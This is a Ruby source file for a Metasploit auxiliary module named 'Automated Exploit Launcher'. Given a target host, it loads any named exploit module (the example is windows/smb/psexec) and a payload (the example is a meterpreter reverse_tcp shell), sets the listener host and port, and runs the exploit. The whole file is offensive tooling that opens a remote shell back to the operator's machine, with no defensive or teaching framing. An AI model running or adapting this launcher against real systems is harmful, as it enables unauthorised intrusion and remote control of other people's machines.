#!/usr/bin/env ruby
# automated_exploit_launcher.rb
# A Metasploit auxiliary module to automatically launch a specified exploit with a chosen payload.
# Place this file in: modules/auxiliary/automated_exploit_launcher.rb

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Automated Exploit Launcher',
      'Description'    => %q{
        This module automates the configuration and execution of a given
        exploit module with a specified payload against a target system.
      },
      'Author'         => ['Ahmed Belhaj', 'Xavier'],
      'License'        => MSF_LICENSE
    ))

    register_options([
      Opt::RHOST(),
      OptString.new('EXPLOIT', [true, 'Exploit module to use, e.g. windows/smb/psexec', '']),
      OptString.new('PAYLOAD', [true, 'Payload to use, e.g. windows/meterpreter/reverse_tcp', '']),
      Opt::LHOST(),
      Opt::LPORT()
    ])
  end

  def run
    rhost        = datastore['RHOST']
    exploit_name = datastore['EXPLOIT']
    payload_name = datastore['PAYLOAD']
    lhost        = datastore['LHOST']
    lport        = datastore['LPORT']

    print_status("[*] Launching exploit #{exploit_name} against #{rhost} with payload #{payload_name}")

    # Create and configure exploit module
    begin
      exploit_mod = framework.exploits.create(exploit_name)
    rescue
      return print_error("[-] Exploit module #{exploit_name} not found")
    end

    exploit_mod.datastore['RHOST']  = rhost
    exploit_mod.datastore['PAYLOAD'] = payload_name
    exploit_mod.datastore['LHOST']   = lhost
    exploit_mod.datastore['LPORT']   = lport

    # Create and configure payload, if needed
    begin
      payload_mod = framework.payloads.create(payload_name)
      payload_mod.datastore['LHOST'] = lhost
      payload_mod.datastore['LPORT'] = lport
    rescue
      return print_error("[-] Payload module #{payload_name} not found")
    end

    print_status("[*] Running exploit...")
    
    begin
      # Execute exploit (synchronous)
      exploit_mod.exploit_simple(
        'Payload'   => payload_name,
        'RunAsJob'  => false
      )
    rescue => e
      print_error("[-] Error running exploit: #{e.message}")
    end
  end
end